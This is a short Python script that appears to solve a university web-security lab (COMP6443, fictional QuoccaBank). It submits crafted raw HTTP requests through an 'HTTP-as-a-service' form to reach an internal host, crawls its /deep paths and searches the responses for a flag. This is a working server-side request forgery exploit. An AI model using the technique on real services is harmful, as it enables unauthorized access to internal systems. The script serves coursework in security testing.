import requests
import re
from urllib3.exceptions import InsecureRequestWarning

# Silences warnings about not verifying Burp's CA certificate.
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Create a session object to save settings for the lifetime of the script.
s = requests.session()
s.verify = False  # Skip trying to verify TLS certs, due to Burp's CA.
s.proxies = {"https": "http://127.0.0.1:8080"}  # Proxy requests through Burp.

urls = ["/deep"]
visited = set()

while urls:
    subdom = urls.pop()
    if subdom in visited:
        continue
    visited.add(subdom)

    payload = "GET " + subdom +  """ HTTP/1.1
Host: kb.quoccabank.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://haas.quoccabank.com/
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: http://haas.quoccabank.com
Connection: keep-alive\n\n"""

    data = {
        "requestBox": payload,
    }

    r = s.post("http://haas.quoccabank.com", data=data)
    content = r.content.decode()
    print("content " + content + '\n' + "payload" + payload)

    search = re.search(r'.*COMP6443.*', content)
    if search:
        print(search.group())
    urls.extend(re.findall(r'(/deep/\w+)', content))